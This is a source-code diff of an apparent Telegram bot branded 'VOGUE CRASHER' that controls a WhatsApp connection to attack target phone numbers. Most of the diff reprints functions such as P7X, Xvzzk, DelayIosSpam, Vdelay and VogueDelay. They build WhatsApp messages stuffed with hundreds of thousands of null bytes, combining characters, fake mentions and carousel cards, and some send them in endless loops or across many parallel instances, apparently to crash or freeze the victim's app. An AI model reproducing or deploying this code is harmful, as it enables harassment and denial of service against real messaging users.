     const hours = Math.floor((uptime % 86400) / 3600);
     const minutes = Math.floor((uptime % 3600) / 60);
     const seconds = Math.floor(uptime % 60);
-
+    
     const runtime =
         `${days}d ${hours}h ${minutes}m ${seconds}s`;
-
+    
     const cpuModel = os.cpus()[0].model;
     const cpuCores = os.cpus().length;
     const cpuArch = os.arch();
     const cpuLoad = os.loadavg()[0].toFixed(2);
-
+    
     const platform = os.platform();
     const hostname = os.hostname();
-
+    
     const senderStatus =
-        isWhatsAppConnected
-            ? "Connected"
-            : "Disconnected";
-
+        isWhatsAppConnected ?
+        "Connected" :
+        "Disconnected";
+    
     const currentTime = moment()
         .tz("Asia/Jakarta")
         .format("DD/MM/YYYY HH:mm:ss");
-
+    
     const pages = [
-
-`<pre>
+        
+        `<pre>
 ┏━ V O G U E • I N F O ━┓
 
 ⌬ BOT INFORMATION
@@ -3160,8 +3129,8 @@ bot.on("callback_query", async (ctx) => {
 
 ┗━━━━━━━━━━━━━━━━━━━━━━┛
 </pre>`,
-
-`<pre>
+        
+        `<pre>
 ┏━ W H A T S A P P ━┓
 
 ⌬ CONNECTION INFORMATION
@@ -3183,8 +3152,8 @@ bot.on("callback_query", async (ctx) => {
 
 ┗━━━━━━━━━━━━━━━━━━━━━━┛
 </pre>`,
-
-`<pre>
+        
+        `<pre>
 ┏━ V P S • I N F O ━┓
 
 ⌬ SERVER INFORMATION
@@ -3209,8 +3178,8 @@ bot.on("callback_query", async (ctx) => {
 
 ┗━━━━━━━━━━━━━━━━━━━━━━┛
 </pre>`,
-
-`<pre>
+        
+        `<pre>
 ┏━ R A M • U S A G E ━┓
 
 ⌬ MEMORY INFORMATION
@@ -3237,30 +3206,29 @@ or service failure.
 
 ┗━━━━━━━━━━━━━━━━━━━━━━┛
 </pre>`
-
+        
     ];
-
+    
     const keyboard = {
         inline_keyboard: [
             [
-                {
-                    text: "◀ Back",
-                    callback_data: `info_back_${page}`
-                },
-                {
-                    text: `${page + 1}/${pages.length}`,
-                    callback_data: "info_page"
-                },
-                {
-                    text: "Next ▶",
-                    callback_data: `info_next_${page}`
-                }
-            ]
+            {
+                text: "◀ Back",
+                callback_data: `info_back_${page}`
+            },
+            {
+                text: `${page + 1}/${pages.length}`,
+                callback_data: "info_page"
+            },
+            {
+                text: "Next ▶",
+                callback_data: `info_next_${page}`
+            }]
         ]
     };
-
+    
     try {
-
+        
         await ctx.editMessageCaption(
             pages[page],
             {
@@ -3268,11 +3236,11 @@ or service failure.
                 reply_markup: keyboard
             }
         );
-
+        
         await ctx.answerCbQuery();
-
+        
     } catch (e) {}
-
+    
 });
 
 bot.command('ping', async (ctx) => {
@@ -3403,7 +3371,7 @@ Status      : Success
                     await sleep(2000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
-                   
+                    
                 }
             }
             
@@ -3475,78 +3443,76 @@ Dispatch engine initialized.
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                {
-                                    text: "Check Target",
-                                    url: `https://wa.me/${q}`,
-                                    style: "primary"
-                                }
-                            ]
+                            {
+                                text: "Check Target",
+                                url: `https://wa.me/${q}`,
+                                style: "primary"
+                            }]
                         ]
                     }
                 }
             );
         
         (async () => {
-
+            
             const instanceBase = Date.now();
-        
+            
             const totalInstances = executionCount;
-        
+            
             const createInstance = async (instanceIndex) => {
-        
+                
                 const instanceId = `${instanceBase}-${instanceIndex}`;
-        
+                
                 try {
-        
+                    
                     for (let i = 0; i < 10; i++) {
-        
+                        
                         try {
-        
+                            
                             if (!sock) {
                                 throw new Error("Socket unavailable");
                             }
-        
+                            
                             await P7X(sock, target);
                             await sleep(3000)
-        
+                            
                             console.log(
                                 `[INSTANCE ${instanceId}] Exec ${i + 1}`
                             );
-        
+                            
                         } catch (e) {
-        
+                            
                             console.log(
                                 `[INSTANCE ${instanceId}] Error: ${e.message}`
                             );
-        
-                           
+                            
+                            
                         }
                     }
-        
+                    
                     console.log(
                         `[INSTANCE ${instanceId}] DONE`
                     );
-        
+                    
                 } catch (err) {
-        
+                    
                     console.log(
                         `[INSTANCE ${instanceId}] FAILED: ${err.message}`
                     );
                 }
             };
-        
+            
             // 🔥 BANGUN SEMUA INSTANCE SEKALIGUS
-            const allInstances = Array.from(
-                { length: totalInstances },
+            const allInstances = Array.from({ length: totalInstances },
                 (_, i) => createInstance(i + 1)
             );
-        
+            
             await Promise.allSettled(allInstances);
-        
+            
             console.log(
                 `[SYSTEM] All ${totalInstances} instances completed`
             );
-        
+            
         })();
         
     } catch (error) {
@@ -3622,12 +3588,12 @@ Status      : Success
                     console.log(
                         `[VOGUE CRASHER] Dispatch Error: ${e.message}`
                     );
-                   
+                    
                 }
                 
                 await sleep(1500);
             }
-           
+            
             console.log(
                 `[VOGUE CRASHER] Execution completed successfully for ${q}`
             );
@@ -4093,354 +4059,350 @@ async function HardStatusBlast(sock, target) {
 }
 
 async function Xvzzk(sock, target) {
-  while (true) {
-    let message = {
-      imageMessage: {
-        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
-        mimetype: "image/jpeg",
-        caption: " X ",
-        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
-        fileLength: "19769",
-        height: 354,
-        width: 783,
-        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
-        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
-        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
-        mediaKeyTimestamp: "1743225419",
-        jpegThumbnail: null,
-        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
-        scanLengths: [24378, 17332],
-        contextInfo: {
-          urlTrackingMap: {
-            urlTrackingMapElements: Array.from(
-              { length: 500000 },
-              () => ({ "\0": "\0" })
-            )
-          },
-          remoteJid: "status@broadcast",
-          groupMentions: [],
-          entryPointConversionSource: "booking_status"
-        }
-      }
-    };
-    
-    const msg = generateWAMessageFromContent(target, message, {});
-    await sock.relayMessage("status@broadcast", msg.message, {
-      messageId: msg.key.id,
-      statusJidList: [target],
-      additionalNodes: [{
-        tag: "meta",
-        attrs: {},
-        content: [{
-          tag: "mentioned_users",
-          attrs: {},
-          content: [{
-            tag: "to",
-            attrs: { jid: target },
-            content: undefined
-          }]
-        }]
-      }]
-    });
-    await new Promise((r) => setTimeout(r, 2000));
-
-    await sock.relayMessage(target, {
-      groupStatusMessageV2: {
-        message: {
-          interactiveResponseMessage: {
-            body: {
-              text: " X ",
-              format: "DEFAULT"
-            },
-            nativeFlowResponseMessage: {
-              name: "payment_method",
-              paramsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(1045000)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
-              version: 3
-            },
-            mentionedJid: [
-              "13135550002@s.whatsapp.net",
-              ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
-            ]
-          }
-        }
-      }
-    }, { participant: { jid: target } });
-    await new Promise((r) => setTimeout(r, 1000));
-  }
+    while (true) {
+        let message = {
+            imageMessage: {
+                url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
+                mimetype: "image/jpeg",
+                caption: " X ",
+                fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
+                fileLength: "19769",
+                height: 354,
+                width: 783,
+                mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
+                fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
+                directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
+                mediaKeyTimestamp: "1743225419",
+                jpegThumbnail: null,
+                scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
+                scanLengths: [24378, 17332],
+                contextInfo: {
+                    urlTrackingMap: {
+                        urlTrackingMapElements: Array.from({ length: 500000 },
+                            () => ({ "\0": "\0" })
+                        )
+                    },
+                    remoteJid: "status@broadcast",
+                    groupMentions: [],
+                    entryPointConversionSource: "booking_status"
+                }
+            }
+        };
+        
+        const msg = generateWAMessageFromContent(target, message, {});
+        await sock.relayMessage("status@broadcast", msg.message, {
+            messageId: msg.key.id,
+            statusJidList: [target],
+            additionalNodes: [{
+                tag: "meta",
+                attrs: {},
+                content: [{
+                    tag: "mentioned_users",
+                    attrs: {},
+                    content: [{
+                        tag: "to",
+                        attrs: { jid: target },
+                        content: undefined
+                    }]
+                }]
+            }]
+        });
+        await new Promise((r) => setTimeout(r, 2000));
+        
+        await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: " X ",
+                            format: "DEFAULT"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "payment_method",
+                            paramsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(1045000)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
+                            version: 3
+                        },
+                        mentionedJid: [
+                            "13135550002@s.whatsapp.net",
+                            ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
+                        ]
+                    }
+                }
+            }
+        }, { participant: { jid: target } });
+        await new Promise((r) => setTimeout(r, 1000));
+    }
 }
 
 async function DelayIosSpam(sock, target) {
-    const Vnx = await generateWAMessageFromContent(target, {
-        botInvokeMessage: {
-            message: {
-                messageContextInfo: {
-                    messageSecret: null,
-                    deviceListMetadata: {},
-                    deviceListMetadataVersion: 2
-                }
-            }
-        },
-        requestPhoneNumberMessage: {
-            locationMessage: {
-                degreesLatitude: -99.9870,
-                degreesLongitude: 107.8909,
-                name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(250000),
-                address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(250000),
-                url: "t.me/LuNgapainMakLuGwjilat",
-                jpegThumbnail: null
-            }
-        },
-        interactiveResponseMessage: {
-            body: {
-                text: "VnX",
-                format: "DEFAULT"
-            },
-            nativeFlowResponseMessage: {
-                name: "address_message",
-                paramsJson: JSON.stringify({
-                    values: {
-                        in_pin_code: "999999",
-                        building_name: "VnX",
-                        landmark_area: "18",
-                        address: "P0K3",
-                        tower_number: "P0k3",
-                        city: "tobrut",
-                        name: "p0k3",
-                        phone_number: "999999999999",
-                        house_number: "13135550002",
-                        floor_number: "@3135550202",
-                        state: "X" + "\u0000".repeat(900000)
-                    }
-                }),
-                version: 3
-            }
-        }
-    }, { userJid: sock.user.id });
-
-    await sock.relayMessage("status@broadcast", Vnx.message, {
-        messageId: Vnx.key.id,
-        statusJidList: [target],
-        additionalNodes: [{
-            tag: "meta",
-            attrs: { status_setting: "contacts" },
-            content: [{
-                tag: "mentioned_users",
-                attrs: {},
-                content: [{
-                    tag: "to",
-                    attrs: { jid: target },
-                    content: undefined
-                }]
-            }]
-        }]
-    });
+    const Vnx = await generateWAMessageFromContent(target, {
+        botInvokeMessage: {
+            message: {
+                messageContextInfo: {
+                    messageSecret: null,
+                    deviceListMetadata: {},
+                    deviceListMetadataVersion: 2
+                }
+            }
+        },
+        requestPhoneNumberMessage: {
+            locationMessage: {
+                degreesLatitude: -99.9870,
+                degreesLongitude: 107.8909,
+                name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(250000),
+                address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(250000),
+                url: "t.me/LuNgapainMakLuGwjilat",
+                jpegThumbnail: null
+            }
+        },
+        interactiveResponseMessage: {
+            body: {
+                text: "VnX",
+                format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+                name: "address_message",
+                paramsJson: JSON.stringify({
+                    values: {
+                        in_pin_code: "999999",
+                        building_name: "VnX",
+                        landmark_area: "18",
+                        address: "P0K3",
+                        tower_number: "P0k3",
+                        city: "tobrut",
+                        name: "p0k3",
+                        phone_number: "999999999999",
+                        house_number: "13135550002",
+                        floor_number: "@3135550202",
+                        state: "X" + "\u0000".repeat(900000)
+                    }
+                }),
+                version: 3
+            }
+        }
+    }, { userJid: sock.user.id });
+    
+    await sock.relayMessage("status@broadcast", Vnx.message, {
+        messageId: Vnx.key.id,
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: { status_setting: "contacts" },
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{
+                    tag: "to",
+                    attrs: { jid: target },
+                    content: undefined
+                }]
+            }]
+        }]
+    });
 }
 
 async function HypermartDiley(sock, jid) {
-  let cards = [];
-  for (let i = 0; i < 1000; i++) {
-  cards.push({
-    body: {
-      text: " "
-    },
-    footer: {
-      text: " "
-    },
-    header: {
-      title: "",
-       hasMediaAttachment: true,
-          imageMessage: {
-           url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
-            mimetype: "image/jpeg",
-            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
-            fileLength: "999999",
-            height: 1,
-            width: 1,
-            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
-            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
-             directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
-              mediaKeyTimestamp: "1737281900",
-              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
-               scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
-               scanLengths: [3537, 10557, 1905, 2353],
-               midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
-          },
-       },
-       nativeFlowMessage: {
-         buttons: [{
-           name: "call_permission_request",
-           buttonParamsJson: JSON.stringify({
-             status: true,
-             type: "videocall"
-           })
-         }]
-       }
-    });
-  }
-  
-  const msg = await generateWAMessageFromContent(jid, {
-    groupStatusMessageV2: {
-      message: {
-        messageContextInfo: {
-          deviceListMetadata: {},
-          deviceListMetadataVersion: 2
-        },
-        interactiveMessage: {
-          body: {
-            text: "kmu mau aku balik kyk dulu?"
-          },
-          footer: {
-            text: "aku sendiri udh gabisa berikir kyk gitu"
-          },
-          header: {
-            hasMediaAttachment: true
-          },
-          carouselMessage: {
-            cards: [...cards]
-          }
-        }
-      }
+    let cards = [];
+    for (let i = 0; i < 1000; i++) {
+        cards.push({
+            body: {
+                text: " "
+            },
+            footer: {
+                text: " "
+            },
+            header: {
+                title: "",
+                hasMediaAttachment: true,
+                imageMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
+                    mimetype: "image/jpeg",
+                    fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
+                    fileLength: "999999",
+                    height: 1,
+                    width: 1,
+                    mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
+                    fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
+                    directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
+                    mediaKeyTimestamp: "1737281900",
+                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
+                    scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
+                    scanLengths: [3537, 10557, 1905, 2353],
+                    midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
+                },
+            },
+            nativeFlowMessage: {
+                buttons: [{
+                    name: "call_permission_request",
+                    buttonParamsJson: JSON.stringify({
+                        status: true,
+                        type: "videocall"
+                    })
+                }]
+            }
+        });
     }
-  }, {});
-  
-  await sock.relayMessage(jid, msg.message, {
-    messageId: msg.key.id, 
-    participant: { jid: jid }
-  });
+    
+    const msg = await generateWAMessageFromContent(jid, {
+        groupStatusMessageV2: {
+            message: {
+                messageContextInfo: {
+                    deviceListMetadata: {},
+                    deviceListMetadataVersion: 2
+                },
+                interactiveMessage: {
+                    body: {
+                        text: "kmu mau aku balik kyk dulu?"
+                    },
+                    footer: {
+                        text: "aku sendiri udh gabisa berikir kyk gitu"
+                    },
+                    header: {
+                        hasMediaAttachment: true
+                    },
+                    carouselMessage: {
+                        cards: [...cards]
+                    }
+                }
+            }
+        }
+    }, {});
+    
+    await sock.relayMessage(jid, msg.message, {
+        messageId: msg.key.id,
+        participant: { jid: jid }
+    });
 }
 
 async function P7X(sock, target) {
-  try {
-      await sock.relayMessage(
-         target,
-          {
-              groupStatusMessageV2: {
-                  message: {
-                      interactiveResponseMessage: {
-                          body: {
-                              text: "Zenz",
-                              format: "DEFAULT"
-                          },
-                          nativeFlowResponseMessage: {
-                              name: "payment_method",
-                              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(9000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
-                              version: 3
-                          },
-                          contextInfo: {
-                              remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
-                              isForwarded: true,
-                              forwardingScore: 9999,
-                              statusAttributionType: 2,
-                              statusAttributions: Array.from({ length: 99999 }, (_, n) => ({
-                                  participant: `62${n + 836598}@s.whatsapp.net`,
-                                  type: 1
-                              }))
-                          }
-                      }
-                  }
-              }
-         },
-     { participant: { jid: target } }
-  );
-
-    const pox = {
-      groupStatusMessageV2: {
-        message: {
-          extendedTextMessage: {
-            text: "\u0000".repeat(1000),
-            viewOnce: true,
-            contextInfo: {
-              mentionedJid: [
-                target,
-                ...Array.from(
-                  { length: 2000 },
-                  () =>
-                    "1" +
-                    Math.floor(Math.random() * 5000000) +
-                    "@s.whatsapp.net"
-                )
-              ],
-              isForwarded: true,
-              statusAttributionType: 3,
-              forwardingScore: 7205,
-              isForwarded: true,
-              pairedMediaType: null,
-              forwardOrigin: "UNKNOWN"
-            }
-          }
-        }
-      }
-    };
-
-    const Apox = {
-      groupStatusMessageV2: {
-        message: {
-          interactiveResponseMessage: {
-            body: {
-              text: "Zen?",
-              format: "DEFAULT"
-            },
-            contextInfo: {
-              mentionedJid: ["13135550002@s.whatsapp.net"]
-            },
-            nativeFlowResponseMessage: {
-              name: "galaxy_message",
-              paramsJson: "\u0000".repeat(90000),
-              version: 3
-            }
-          }
-        }
-      }
-    };
-
-    await sock.relayMessage(target, pox, { participant: { jid: target } });
-    await sock.relayMessage(target, Apox, { participant: { jid: target } });
-  } catch {}
+    try {
+        await sock.relayMessage(
+            target,
+            {
+                groupStatusMessageV2: {
+                    message: {
+                        interactiveResponseMessage: {
+                            body: {
+                                text: "Zenz",
+                                format: "DEFAULT"
+                            },
+                            nativeFlowResponseMessage: {
+                                name: "payment_method",
+                                buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(9000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
+                                version: 3
+                            },
+                            contextInfo: {
+                                remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
+                                isForwarded: true,
+                                forwardingScore: 9999,
+                                statusAttributionType: 2,
+                                statusAttributions: Array.from({ length: 99999 }, (_, n) => ({
+                                    participant: `62${n + 836598}@s.whatsapp.net`,
+                                    type: 1
+                                }))
+                            }
+                        }
+                    }
+                }
+            }, { participant: { jid: target } }
+        );
+        
+        const pox = {
+            groupStatusMessageV2: {
+                message: {
+                    extendedTextMessage: {
+                        text: "\u0000".repeat(1000),
+                        viewOnce: true,
+                        contextInfo: {
+                            mentionedJid: [
+                                target,
+                                ...Array.from({ length: 2000 },
+                                    () =>
+                                    "1" +
+                                    Math.floor(Math.random() * 5000000) +
+                                    "@s.whatsapp.net"
+                                )
+                            ],
+                            isForwarded: true,
+                            statusAttributionType: 3,
+                            forwardingScore: 7205,
+                            isForwarded: true,
+                            pairedMediaType: null,
+                            forwardOrigin: "UNKNOWN"
+                        }
+                    }
+                }
+            }
+        };
+        
+        const Apox = {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "Zen?",
+                            format: "DEFAULT"
+                        },
+                        contextInfo: {
+                            mentionedJid: ["13135550002@s.whatsapp.net"]
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "galaxy_message",
+                            paramsJson: "\u0000".repeat(90000),
+                            version: 3
+                        }
+                    }
+                }
+            }
+        };
+        
+        await sock.relayMessage(target, pox, { participant: { jid: target } });
+        await sock.relayMessage(target, Apox, { participant: { jid: target } });
+    } catch {}
 }
 
 async function Vdelay(sock, target) {
-  while (true) {
-    await sock.sendMessage("status@broadcast", {
-      text: "WHY",
-      contextInfo: {
-        remoteJid: "undefined@s.whatsapp.net",
-        mentionedJid: ["status@broadcast"],
-        isForwarded: true,
-        forwardingScore: 9999
-      },
-      buttons: [
-        {
-          buttonId: "\0",
-          buttonText: { displayText: " 696 " },
-          type: 3,
-          nativeFlowInfo: {
-            name: "voice_call",
-            paramsJson: "\0".repeat(1000000)
-          }
-        }
-      ]
-    }, { 
-      statusJidList: [target],
-      additionalNodes: [{
-        tag: "meta",
-        attrs: {
-          status_setting: "allowlist"
-        },
-        content: [{
-          tag: "mentioned_users",
-          attrs: {},
-          content: [{
-            tag: "to",
-            attrs: {
-              jid: target
-            }
-          }]
-        }]
-      }]
-    });
-    
-    await new Promise((r) => setTimeout(r, 2000));
-  }
+    while (true) {
+        await sock.sendMessage("status@broadcast", {
+            text: "WHY",
+            contextInfo: {
+                remoteJid: "undefined@s.whatsapp.net",
+                mentionedJid: ["status@broadcast"],
+                isForwarded: true,
+                forwardingScore: 9999
+            },
+            buttons: [
+            {
+                buttonId: "\0",
+                buttonText: { displayText: " 696 " },
+                type: 3,
+                nativeFlowInfo: {
+                    name: "voice_call",
+                    paramsJson: "\0".repeat(1000000)
+                }
+            }]
+        }, {
+            statusJidList: [target],
+            additionalNodes: [{
+                tag: "meta",
+                attrs: {
+                    status_setting: "allowlist"
+                },
+                content: [{
+                    tag: "mentioned_users",
+                    attrs: {},
+                    content: [{
+                        tag: "to",
+                        attrs: {
+                            jid: target
+                        }
+                    }]
+                }]
+            }]
+        });
+        
+        await new Promise((r) => setTimeout(r, 2000));
+    }
 }
 
 async function VnXNewOnlyBulldo(sock, target) {
@@ -4463,65 +4425,64 @@ async function VnXNewOnlyBulldo(sock, target) {
 }
 
 async function VogueDelay(sock, target) {
-  for (let i = 0; i < 75; i++) {
-    let VnXImg = {
-      viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-             imageMessage: {
-               url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true",
-               directPath: "/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c",
-              mimetype: 'image/jpeg',
-              caption: 'VnX',
-              mediaKey: "gMU/MAFMpfewBPxf03l77UJ4BFniwIskJin1EAMj8e8=",
-              fileEncSha256: "qMxO75MnLoMaS/b/UuTRAtBNXh2H0HSVPVkJlkmSpgk=",
-              fileSha256: "RbwxheXko2h6rCjgkzKmD+l/wFliuC6SxtY3tbwSNzg=",
-              fileLength: '19897899',
-              mediaKeyTimestamp: "1778296099",
-              title: "VnX" + "ꦽ".repeat(25000) + "ꦾ".repeat(25000) + "𑆿𑆴𑆿".repeat(25000),
-            },
-            body: { text: "Kenal VnX Gk?" },
-            nativeFlowMessage: {
-              buttons: [
-                {
-                  name: "single_select",
-                  buttonParamsJson: JSON.stringify({
-                    icon: "",
-                    flow_cta: "{}",
-                    flow_message_version: "3"
-                  })
-                },
-                {
-                  name: "call_permission_request",
-                  buttonParamsJson: JSON.stringify({
-                    icon: "\u0000".repeat(250000),
-                    flow_cta: "ꦽ".repeat(25000),
-                    flow_message_version: "3"
-                  })
-                },
-                {
-                  name: "galaxy_message",
-                  buttonParamsJson: JSON.stringify({
-                    icon: "\u0000".repeat(250000),
-                    flow_cta: "ꦽ".repeat(25000),
-                    flow_message_version: "3"
-                  })
+    for (let i = 0; i < 75; i++) {
+        let VnXImg = {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: {
+                        header: {
+                            imageMessage: {
+                                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true",
+                                directPath: "/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c",
+                                mimetype: 'image/jpeg',
+                                caption: 'VnX',
+                                mediaKey: "gMU/MAFMpfewBPxf03l77UJ4BFniwIskJin1EAMj8e8=",
+                                fileEncSha256: "qMxO75MnLoMaS/b/UuTRAtBNXh2H0HSVPVkJlkmSpgk=",
+                                fileSha256: "RbwxheXko2h6rCjgkzKmD+l/wFliuC6SxtY3tbwSNzg=",
+                                fileLength: '19897899',
+                                mediaKeyTimestamp: "1778296099",
+                                title: "VnX" + "ꦽ".repeat(25000) + "ꦾ".repeat(25000) + "𑆿𑆴𑆿".repeat(25000),
+                            },
+                            body: { text: "Kenal VnX Gk?" },
+                            nativeFlowMessage: {
+                                buttons: [
+                                {
+                                    name: "single_select",
+                                    buttonParamsJson: JSON.stringify({
+                                        icon: "",
+                                        flow_cta: "{}",
+                                        flow_message_version: "3"
+                                    })
+                                },
+                                {
+                                    name: "call_permission_request",
